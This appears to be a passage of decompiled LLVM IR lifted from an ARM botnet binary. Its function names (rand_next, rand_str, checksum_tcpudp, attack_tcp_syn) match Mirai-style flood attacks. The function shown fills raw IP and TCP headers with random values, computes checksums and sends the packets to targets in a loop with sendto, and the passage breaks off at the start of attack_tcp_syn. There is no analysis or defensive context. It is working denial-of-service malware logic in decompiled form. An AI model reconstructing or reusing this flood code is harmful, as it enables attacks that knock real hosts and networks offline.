  store i32 %v1_bfa4, i32* %r3.global-to-local, align 4
  %v1_c0b8 = and i32 %v4_c0b0, 247
  %v5_c0bc = or i32 %v1_c0b8, %v4_c0bc
  store i32 %v5_c0bc, i32* %r2.global-to-local, align 4
  %v1_c0c0 = trunc i32 %v5_c0bc to i8
  store i8 %v1_c0c0, i8* %v2_c0b0, align 1
  %v0_c0c4 = load i32, i32* @r4, align 4
  %v1_c0c4 = add i32 %v0_c0c4, 13
  %v2_c0c4 = inttoptr i32 %v1_c0c4 to i8*
  %v3_c0c4 = load i8, i8* %v2_c0c4, align 1
  %v4_c0c4 = zext i8 %v3_c0c4 to i32
  store i32 %v1_bfa8, i32* %ip.global-to-local, align 4
  %v1_c0cc = and i32 %v4_c0c4, 251
  %v5_c0d0 = or i32 %v1_c0cc, %v4_c0d0
  store i32 %v5_c0d0, i32* %r3.global-to-local, align 4
  %v1_c0d4 = trunc i32 %v5_c0d0 to i8
  store i8 %v1_c0d4, i8* %v2_c0c4, align 1
  %v0_c0d8 = load i32, i32* @r4, align 4
  %v1_c0d8 = add i32 %v0_c0d8, 13
  %v2_c0d8 = inttoptr i32 %v1_c0d8 to i8*
  %v3_c0d8 = load i8, i8* %v2_c0d8, align 1
  %v4_c0d8 = zext i8 %v3_c0d8 to i32
  store i32 %v1_bfac, i32* %r0.global-to-local, align 4
  %v1_c0e0 = and i32 %v4_c0d8, 253
  %v4_c0e4 = or i32 %v1_c0e0, %v3_c0e4
  store i32 %v4_c0e4, i32* %r2.global-to-local, align 4
  %v1_c0e8 = trunc i32 %v4_c0e4 to i8
  store i8 %v1_c0e8, i8* %v2_c0d8, align 1
  %v0_c0ec = load i32, i32* @r4, align 4
  %v1_c0ec = add i32 %v0_c0ec, 13
  %v2_c0ec = inttoptr i32 %v1_c0ec to i8*
  %v3_c0ec = load i8, i8* %v2_c0ec, align 1
  %v4_c0ec = zext i8 %v3_c0ec to i32
  store i32 %v1_bfb0, i32* %r1.global-to-local, align 4
  %v1_c0f4 = and i32 %v4_c0ec, 254
  %v2_c0f8 = or i32 %v1_c0f4, %v1_bfb0
  store i32 %v2_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = trunc i32 %v2_c0f8 to i8
  store i8 %v1_c0fc, i8* %v2_c0ec, align 1
  %v0_c100 = call i32 @rand_next()
  %v1_c100 = trunc i32 %v0_c100 to i16
  store i32 %v0_c100, i32* %r0.global-to-local, align 4
  store i32 %v1_bfb4, i32* %r2.global-to-local, align 4
  store i1 %v2_c108, i1* %cpsr_z.global-to-local, align 1
  %v3_c114.pre = load i32, i32* @r4, align 4
  br i1 %v2_c108, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_c10c = add i32 %v3_c114.pre, 13
  %v3_c10c = inttoptr i32 %v2_c10c to i8*
  %v4_c10c = load i8, i8* %v3_c10c, align 1
  %v5_c10c = zext i8 %v4_c10c to i32
  %v2_c110 = or i32 %v5_c10c, 8
  store i32 %v2_c110, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_c114 = add i32 %v3_c114.pre, 14
  %v5_c114 = inttoptr i32 %v4_c114 to i16*
  store i16 %v1_c100, i16* %v5_c114, align 2
  store i32 %v6_be64, i32* %r1.global-to-local, align 4
  %v0_c11c = load i32, i32* @r5, align 4
  %v1_c11c = add i32 %v0_c11c, 40
  store i32 %v1_c11c, i32* %r0.global-to-local, align 4
  br i1 %v2_c108, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_c120 = load i32, i32* @r3, align 4
  %v2_c120 = trunc i32 %v1_c120 to i8
  %v3_c120 = load i32, i32* @r4, align 4
  %v4_c120 = add i32 %v3_c120, 13
  %v5_c120 = inttoptr i32 %v4_c120 to i8*
  store i8 %v2_c120, i8* %v5_c120, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_c124 = inttoptr i32 %v1_c11c to i16*
  %v3_c124 = call i32 @rand_str(i16* %v2_c124, i32 %v6_be64)
  store i32 %v3_c124, i32* %r0.global-to-local, align 4
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c128, i32* %r3.global-to-local, align 4
  %v1_c12c = add i32 %v3_c128, 1
  store i32 %v1_c12c, i32* @r4, align 4
  %v1_c130 = load i32, i32* @r7, align 4
  %v9_c130 = icmp eq i32 %v1_c12c, %v1_c130
  store i1 %v9_c130, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c12c, i32* %stack_var_-44, align 4
  %v5_c138 = icmp slt i32 %v1_c12c, %v1_c130
  br i1 %v5_c138, label %dec_label_pc_bfd4, label %dec_label_pc_c13c

dec_label_pc_c13c:                                ; preds = %bb70
  store i32 %v6_be64, i32* %r3.global-to-local, align 4
  %v1_c140 = add i32 %v6_be64, 20
  store i32 %v1_c140, i32* @sb, align 4
  br label %dec_label_pc_c148

dec_label_pc_c148:                                ; preds = %dec_label_pc_c38c, %dec_label_pc_c13c
  %v0_c1608 = phi i32 [ %v1_c130, %dec_label_pc_c13c ], [ 0, %dec_label_pc_c38c ]
  %stack_var_-140.0 = phi i32 [ %v3_bf24, %dec_label_pc_c13c ], [ %v3_c398, %dec_label_pc_c38c ]
  %storemerge = add i32 %v6_be64, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_c14c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_c14c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_c14c, 256
  %v3_c154 = and i32 %tmp71, 65280
  store i32 %v3_c154, i32* %r3.global-to-local, align 4
  %v4_c158 = udiv i32 %v1_c14c, 16777216
  %v5_c158 = or i32 %v3_c154, %v4_c158
  store i32 %v5_c158, i32* @sl, align 4
  %v3_c2f8 = icmp eq i32 %v3_befc, 65535
  %v2_c35c = icmp eq i32 %v1_be8c, 0
  %v2_c198 = icmp eq i32 %v6_bea0, -1
  %v7_c198 = icmp eq i32 %v6_bea0, -1
  br label %dec_label_pc_c15c

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_c274, %dec_label_pc_c148
  %v0_c160 = phi i32 [ %v0_c1608, %dec_label_pc_c148 ], [ 0, %dec_label_pc_c274 ], [ 0, %dec_label_pc_c15c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c160 = icmp eq i32 %v0_c160, 0
  store i1 %v2_c160, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c160, label %dec_label_pc_c15c, label %dec_label_pc_c16c

dec_label_pc_c16c:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_c274
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c170

dec_label_pc_c170:                                ; preds = %dec_label_pc_c1f0, %dec_label_pc_c16c
  %v1_c184 = phi i32 [ %v1_c264, %dec_label_pc_c1f0 ], [ 0, %dec_label_pc_c16c ]
  %v5_c174 = mul i32 %v1_c184, 24
  %v1_c178 = load i32, i32* @r8, align 4
  %v2_c178 = add i32 %v1_c178, %v5_c174
  store i32 %v2_c178, i32* %r3.global-to-local, align 4
  store i32 %v2_bcd0, i32* %ip.global-to-local, align 4
  %v1_c180 = add i32 %v2_c178, 20
  %v2_c180 = inttoptr i32 %v1_c180 to i8*
  %v3_c180 = load i8, i8* %v2_c180, align 1
  %v4_c180 = zext i8 %v3_c180 to i32
  store i32 %v4_c180, i32* %r2.global-to-local, align 4
  %v4_c184 = mul i32 %v1_c184, 4
  %v5_c184 = add i32 %v4_c184, %v2_bcd0
  %v6_c184 = inttoptr i32 %v5_c184 to i32*
  %v7_c184 = load i32, i32* %v6_c184, align 4
  store i32 %v7_c184, i32* @r5, align 4
  %v7_c188 = icmp eq i8 %v3_c180, 31
  store i1 %v7_c188, i1* %cpsr_z.global-to-local, align 1
  %v1_c18c = add i32 %v7_c184, 20
  store i32 %v1_c18c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_c180, 32
  br i1 %tmp77, label %dec_label_pc_c288, label %dec_label_pc_c194

dec_label_pc_c194:                                ; preds = %dec_label_pc_c170
  store i32 %v6_bea0, i32* %r0.global-to-local, align 4
  store i1 %v7_c198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c198, label %dec_label_pc_c2e8, label %dec_label_pc_c1a0

dec_label_pc_c1a0:                                ; preds = %dec_label_pc_c288, %dec_label_pc_c194
  store i32 %v3_befc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c2f8, label %dec_label_pc_c304, label %dec_label_pc_c1b4

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_c2e8.dec_label_pc_c1b4_crit_edge, %dec_label_pc_c1a0
  %v1_c1b8 = phi i32 [ %v1_c1b8.pre, %dec_label_pc_c2e8.dec_label_pc_c1b4_crit_edge ], [ 65535, %dec_label_pc_c1a0 ]
  store i32 %v3_bf00, i32* %r2.global-to-local, align 4
  %v9_c1b8 = icmp eq i32 %v3_bf00, %v1_c1b8
  store i1 %v9_c1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c1b8, label %dec_label_pc_c318, label %dec_label_pc_c1c0

dec_label_pc_c1c0:                                ; preds = %dec_label_pc_c304.dec_label_pc_c1c0_crit_edge, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v1_c1c4.pre, %dec_label_pc_c304.dec_label_pc_c1c0_crit_edge ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bf04, i32* %r3.global-to-local, align 4
  %v9_c1c4 = icmp eq i32 %v3_bf04, %v1_c1c4
  store i1 %v9_c1c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c1c4, label %dec_label_pc_c32c, label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_c318.dec_label_pc_c1cc_crit_edge, %dec_label_pc_c1c0
  %v1_c1d0 = phi i32 [ %v1_c1d0.pre, %dec_label_pc_c318.dec_label_pc_c1cc_crit_edge ], [ %v1_c1c4, %dec_label_pc_c1c0 ]
  store i32 %v5_bda0, i32* %ip.global-to-local, align 4
  %v9_c1d0 = icmp eq i32 %v5_bda0, %v1_c1d0
  store i1 %v9_c1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c1d0, label %dec_label_pc_c340, label %dec_label_pc_c1d8

dec_label_pc_c1d8:                                ; preds = %dec_label_pc_c32c.dec_label_pc_c1d8_crit_edge, %dec_label_pc_c1cc
  %v1_c1dc = phi i32 [ %v1_c1dc.pre, %dec_label_pc_c32c.dec_label_pc_c1d8_crit_edge ], [ %v1_c1d0, %dec_label_pc_c1cc ]
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  %v9_c1dc = icmp eq i32 %v6_bdbc, %v1_c1dc
  store i1 %v9_c1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c1dc, label %dec_label_pc_c354, label %dec_label_pc_c1e4

dec_label_pc_c1e4:                                ; preds = %dec_label_pc_c340, %dec_label_pc_c1d8
  store i32 %v1_be8c, i32* %r1.global-to-local, align 4
  store i1 %v2_c35c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c35c, label %dec_label_pc_c1f0, label %dec_label_pc_c368

dec_label_pc_c1f0:                                ; preds = %dec_label_pc_c1e4, %dec_label_pc_c354, %dec_label_pc_c368
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c1f4 = load i32, i32* @r5, align 4
  %v3_c1f4 = add i32 %v2_c1f4, 10
  %v4_c1f4 = inttoptr i32 %v3_c1f4 to i16*
  store i16 0, i16* %v4_c1f4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* @r0, align 4
  %v2_c200 = call i32 @checksum_generic(i32 %v0_c1fc, i32 20)
  %v3_c200 = trunc i32 %v2_c200 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c208 = load i32, i32* @r5, align 4
  %v4_c208 = add i32 %v3_c208, 10
  %v5_c208 = inttoptr i32 %v4_c208 to i16*
  store i16 %v3_c200, i16* %v5_c208, align 2
  %v0_c20c = load i32, i32* @r6, align 4
  store i32 %v0_c20c, i32* @r1, align 4
  %v0_c210 = load i32, i32* %r3.global-to-local, align 4
  %v1_c210 = trunc i32 %v0_c210 to i16
  %v3_c210 = add i32 %v0_c20c, 16
  %v4_c210 = inttoptr i32 %v3_c210 to i16*
  store i16 %v1_c210, i16* %v4_c210, align 2
  %v0_c214 = load i32, i32* @sl, align 4
  store i32 %v0_c214, i32* %r2.global-to-local, align 4
  %v0_c218 = load i32, i32* @sb, align 4
  store i32 %v0_c218, i32* %r3.global-to-local, align 4
  %v0_c21c = load i32, i32* @r5, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v4_c220 = call i32 @checksum_tcpudp(i32 %v0_c21c, i32 %v0_c20c, i32 %v0_c214, i32 %v0_c218)
  %v5_c220 = trunc i32 %v4_c220 to i16
  store i32 %v4_c220, i32* %r0.global-to-local, align 4
  %v3_c224 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c224, i32* %r3.global-to-local, align 4
  %v3_c228 = mul i32 %v3_c224, 32
  store i32 %v3_c228, i32* %lr.global-to-local, align 4
  %v3_c22c = load i32, i32* @r6, align 4
  %v4_c22c = add i32 %v3_c22c, 16
  %v5_c22c = inttoptr i32 %v4_c22c to i16*
  store i16 %v5_c220, i16* %v5_c22c, align 2
  %v0_c230 = load i32, i32* %lr.global-to-local, align 4
  %v1_c230 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c230, -8
  %v5_c230 = add i32 %v0_c230, %tmp78
  store i32 %v5_c230, i32* %lr.global-to-local, align 4
  %v0_c234 = load i32, i32* @r6, align 4
  %v1_c234 = add i32 %v0_c234, 2
  %v2_c234 = inttoptr i32 %v1_c234 to i16*
  %v3_c234 = load i16, i16* %v2_c234, align 2
  %v4_c234 = zext i16 %v3_c234 to i32
  store i32 %v4_c234, i32* @r6, align 4
  %v1_c238 = load i32, i32* @r8, align 4
  %v2_c238 = add i32 %v1_c238, %v5_c230
  store i32 %v2_c238, i32* @lr, align 4
  %v3_c23c = add i32 %v2_c238, 2
  %v4_c23c = inttoptr i32 %v3_c23c to i16*
  store i16 %v3_c234, i16* %v4_c23c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c248 = load i32, i32* @r5, align 4
  store i32 %v0_c248, i32* %r1.global-to-local, align 4
  store i32 %v3_beb4, i32* %r0.global-to-local, align 4
  %v0_c250 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c250, i32* %r2.global-to-local, align 4
  %v0_c254 = load i32, i32* @lr, align 4
  %v6_c25c = call i32 @__libc_sendto(i32 %v3_beb4, i32 %v0_c248, i32 %v0_c250, i32 16384, i32 %v0_c254, i32 16)
  %v3_c260 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c260, i32* %r3.global-to-local, align 4
  %v1_c264 = add i32 %v3_c260, 1
  store i32 %v1_c264, i32* %r0.global-to-local, align 4
  %v1_c268 = load i32, i32* @r7, align 4
  %v9_c268 = icmp eq i32 %v1_c264, %v1_c268
  store i1 %v9_c268, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c264, i32* %stack_var_-44, align 4
  %v5_c270 = icmp slt i32 %v1_c264, %v1_c268
  br i1 %v5_c270, label %dec_label_pc_c170, label %dec_label_pc_c274

dec_label_pc_c274:                                ; preds = %dec_label_pc_c1f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c278 = icmp eq i32 %v1_c268, 0
  store i1 %v2_c278, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c278, label %dec_label_pc_c15c, label %dec_label_pc_c16c

dec_label_pc_c288:                                ; preds = %dec_label_pc_c170
  %v1_c288 = add i32 %v2_c178, 16
  %v2_c288 = inttoptr i32 %v1_c288 to i32*
  %v3_c288 = load i32, i32* %v2_c288, align 4
  %v0_c28c = call i32 @rand_next()
  store i32 %v0_c28c, i32* %r0.global-to-local, align 4
  %v3_c290 = load i32, i32* %stack_var_-44, align 4
  %v5_c298 = mul i32 %v3_c290, 24
  %v1_c29c = and i32 %v3_c288, 16711680
  store i32 %v1_c29c, i32* %ip.global-to-local, align 4
  %v3_c2a0 = udiv i32 %v3_c288, 16777216
  %v4_c2a4 = udiv i32 %v1_c29c, 256
  %v5_c2a4 = or i32 %v4_c2a4, %v3_c2a0
  store i32 %v5_c2a4, i32* %r2.global-to-local, align 4
  %v1_c2a8 = load i32, i32* @r8, align 4
  %v2_c2a8 = add i32 %v1_c2a8, %v5_c298
  store i32 %v2_c2a8, i32* %r1.global-to-local, align 4
  %v1_c2ac = and i32 %v3_c288, 65280
  store i32 %v1_c2ac, i32* %r3.global-to-local, align 4
  %v1_c2b0 = add i32 %v2_c2a8, 20
  %v2_c2b0 = inttoptr i32 %v1_c2b0 to i8*
  %v3_c2b0 = load i8, i8* %v2_c2b0, align 1
  %v4_c2b0 = zext i8 %v3_c2b0 to i32
  store i32 %v4_c2b0, i32* %ip.global-to-local, align 4
  %v5_c2b8 = call i32 @llvm.bswap.i32(i32 %v3_c288)
  %v7_c2bc = lshr i32 %v0_c28c, %v4_c2b0
  %v8_c2bc = add i32 %v7_c2bc, %v5_c2b8
  store i32 %v8_c2bc, i32* %r2.global-to-local, align 4
  %v1_c2cc = and i32 %v8_c2bc, 65280
  store i32 %v1_c2cc, i32* %r1.global-to-local, align 4
  store i32 %v6_bea0, i32* %r0.global-to-local, align 4
  %v5_c2d8 = call i32 @llvm.bswap.i32(i32 %v8_c2bc)
  store i32 %v5_c2d8, i32* %r3.global-to-local, align 4
  store i1 %v7_c198, i1* %cpsr_z.global-to-local, align 1
  %v1_c2e0 = load i32, i32* @r5, align 4
  %v2_c2e0 = add i32 %v1_c2e0, 16
  %v3_c2e0 = inttoptr i32 %v2_c2e0 to i32*
  store i32 %v5_c2d8, i32* %v3_c2e0, align 4
  br i1 %v2_c198, label %dec_label_pc_c2e8, label %dec_label_pc_c1a0

dec_label_pc_c2e8:                                ; preds = %dec_label_pc_c288, %dec_label_pc_c194
  %v0_c2e8 = call i32 @rand_next()
  store i32 %v0_c2e8, i32* %r0.global-to-local, align 4
  store i32 %v3_befc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c2f8, i1* %cpsr_z.global-to-local, align 1
  %v1_c2fc = load i32, i32* @r5, align 4
  %v2_c2fc = add i32 %v1_c2fc, 12
  %v3_c2fc = inttoptr i32 %v2_c2fc to i32*
  store i32 %v0_c2e8, i32* %v3_c2fc, align 4
  br i1 %v3_c2f8, label %dec_label_pc_c304, label %dec_label_pc_c2e8.dec_label_pc_c1b4_crit_edge

dec_label_pc_c2e8.dec_label_pc_c1b4_crit_edge:    ; preds = %dec_label_pc_c2e8
  %v1_c1b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c1b4

dec_label_pc_c304:                                ; preds = %dec_label_pc_c2e8, %dec_label_pc_c1a0
  %v0_c304 = call i32 @rand_next()
  %v1_c304 = trunc i32 %v0_c304 to i16
  store i32 %v0_c304, i32* %r0.global-to-local, align 4
  store i32 %v3_bf00, i32* %r2.global-to-local, align 4
  %v1_c30c = load i32, i32* @r4, align 4
  %v9_c30c = icmp eq i32 %v3_bf00, %v1_c30c
  store i1 %v9_c30c, i1* %cpsr_z.global-to-local, align 1
  %v3_c310 = load i32, i32* @r5, align 4
  %v4_c310 = add i32 %v3_c310, 4
  %v5_c310 = inttoptr i32 %v4_c310 to i16*
  store i16 %v1_c304, i16* %v5_c310, align 2
  br i1 %v9_c30c, label %dec_label_pc_c318, label %dec_label_pc_c304.dec_label_pc_c1c0_crit_edge

dec_label_pc_c304.dec_label_pc_c1c0_crit_edge:    ; preds = %dec_label_pc_c304
  %v1_c1c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c1c0

dec_label_pc_c318:                                ; preds = %dec_label_pc_c304, %dec_label_pc_c1b4
  %v0_c318 = call i32 @rand_next()
  %v1_c318 = trunc i32 %v0_c318 to i16
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  store i32 %v3_bf04, i32* %r3.global-to-local, align 4
  %v1_c320 = load i32, i32* @r4, align 4
  %v9_c320 = icmp eq i32 %v3_bf04, %v1_c320
  store i1 %v9_c320, i1* %cpsr_z.global-to-local, align 1
  %v3_c324 = load i32, i32* @r5, align 4
  %v4_c324 = add i32 %v3_c324, 20
  %v5_c324 = inttoptr i32 %v4_c324 to i16*
  store i16 %v1_c318, i16* %v5_c324, align 2
  br i1 %v9_c320, label %dec_label_pc_c32c, label %dec_label_pc_c318.dec_label_pc_c1cc_crit_edge

dec_label_pc_c318.dec_label_pc_c1cc_crit_edge:    ; preds = %dec_label_pc_c318
  %v1_c1d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c1cc

dec_label_pc_c32c:                                ; preds = %dec_label_pc_c318, %dec_label_pc_c1c0
  %v0_c32c = call i32 @rand_next()
  %v1_c32c = trunc i32 %v0_c32c to i16
  store i32 %v0_c32c, i32* %r0.global-to-local, align 4
  store i32 %v5_bda0, i32* %ip.global-to-local, align 4
  %v1_c334 = load i32, i32* @r4, align 4
  %v9_c334 = icmp eq i32 %v5_bda0, %v1_c334
  store i1 %v9_c334, i1* %cpsr_z.global-to-local, align 1
  %v3_c338 = load i32, i32* @r6, align 4
  %v4_c338 = add i32 %v3_c338, 2
  %v5_c338 = inttoptr i32 %v4_c338 to i16*
  store i16 %v1_c32c, i16* %v5_c338, align 2
  br i1 %v9_c334, label %dec_label_pc_c340, label %dec_label_pc_c32c.dec_label_pc_c1d8_crit_edge

dec_label_pc_c32c.dec_label_pc_c1d8_crit_edge:    ; preds = %dec_label_pc_c32c
  %v1_c1dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c1d8

dec_label_pc_c340:                                ; preds = %dec_label_pc_c32c, %dec_label_pc_c1cc
  %v0_c340 = call i32 @rand_next()
  %v1_c344 = load i32, i32* @r6, align 4
  %v2_c344 = add i32 %v1_c344, 4
  %v3_c344 = inttoptr i32 %v2_c344 to i32*
  store i32 %v0_c340, i32* %v3_c344, align 4
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  %v1_c34c = load i32, i32* @r4, align 4
  %v9_c34c = icmp eq i32 %v6_bdbc, %v1_c34c
  store i1 %v9_c34c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c34c, label %dec_label_pc_c354, label %dec_label_pc_c1e4

dec_label_pc_c354:                                ; preds = %dec_label_pc_c340, %dec_label_pc_c1d8
  %v0_c354 = call i32 @rand_next()
  store i32 %v0_c354, i32* %r0.global-to-local, align 4
  store i32 %v1_be8c, i32* %r1.global-to-local, align 4
  store i1 %v2_c35c, i1* %cpsr_z.global-to-local, align 1
  %v1_c360 = load i32, i32* @r6, align 4
  %v2_c360 = add i32 %v1_c360, 8
  %v3_c360 = inttoptr i32 %v2_c360 to i32*
  store i32 %v0_c354, i32* %v3_c360, align 4
  br i1 %v2_c35c, label %dec_label_pc_c1f0, label %dec_label_pc_c368

dec_label_pc_c368:                                ; preds = %dec_label_pc_c1e4, %dec_label_pc_c354
  %v0_c368 = load i32, i32* @r5, align 4
  %v1_c368 = add i32 %v0_c368, 40
  store i32 %v1_c368, i32* %r0.global-to-local, align 4
  store i32 %v6_be64, i32* %r1.global-to-local, align 4
  %v2_c370 = inttoptr i32 %v1_c368 to i16*
  %v3_c370 = call i32 @rand_str(i16* %v2_c370, i32 %v6_be64)
  store i32 %v3_c370, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1f0

dec_label_pc_c378:                                ; preds = %dec_label_pc_bec4
  store i32 %v3_beb4, i32* %r0.global-to-local, align 4
  %v1_c37c = call i32 @__GI___libc_close(i32 %v3_beb4)
  store i32 %v1_c37c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c380

dec_label_pc_c380:                                ; preds = %entry, %dec_label_pc_c378
  %v1_c388 = phi i32 [ %v3_beb4, %entry ], [ %v1_c37c, %dec_label_pc_c378 ]
  store i32 %v18_bcb4, i32* %sb.global-to-local, align 4
  store i32 %v24_bcb4, i32* %fp.global-to-local, align 4
  store i32 %v27_bcb4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c388

dec_label_pc_c38c:                                ; preds = %dec_label_pc_beec
  store i32 %v6_be64, i32* %r0.global-to-local, align 4
  %v1_c394 = add i32 %v6_be64, 20
  store i32 %v1_c394, i32* @sb, align 4
  %v3_c398 = mul i32 %v6_be64, 65536
  store i32 %v3_c398, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c148

; uselistorder directives
  uselistorder i32 %v0_c32c, { 1, 0 }
  uselistorder i32 %v0_c318, { 1, 0 }
  uselistorder i32 %v0_c304, { 1, 0 }
  uselistorder i32 %v5_c2d8, { 1, 0 }
  uselistorder i32 %v3_c288, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c264, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c230, { 1, 0 }
  uselistorder i32 %v4_c220, { 1, 0 }
  uselistorder i1 %v7_c198, { 2, 1, 0 }
  uselistorder i1 %v2_c35c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c2f8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_c12c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c100, { 1, 0 }
  uselistorder i32 %v1_bfb4, { 1, 2, 0 }
  uselistorder i32 %v1_bfb0, { 2, 1, 0 }
  uselistorder i32 %v1_bfac, { 2, 0, 1 }
  uselistorder i32 %v1_bfa8, { 2, 0, 1 }
  uselistorder i32 %v1_bfa4, { 2, 0, 1 }
  uselistorder i32 %v1_bf7c, { 1, 0 }
  uselistorder i32 %v3_bf24, { 1, 0 }
  uselistorder i32 %v3_befc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bef4, { 1, 0, 2 }
  uselistorder i32 %v0_bef0, { 1, 0, 2 }
  uselistorder i32 %v0_beec, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bee4, { 1, 0 }
  uselistorder i1 %v7_beb8, { 1, 0 }
  uselistorder i32 %v3_beb4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bea0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_be8c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_be64, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bdbc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bda0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bd50, { 1, 0 }
  uselistorder i32 %v2_bcd0, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c380, { 1, 0 }
  uselistorder label %dec_label_pc_c368, { 1, 0 }
  uselistorder label %dec_label_pc_c1f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c16c, { 1, 0 }
  uselistorder label %dec_label_pc_c15c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
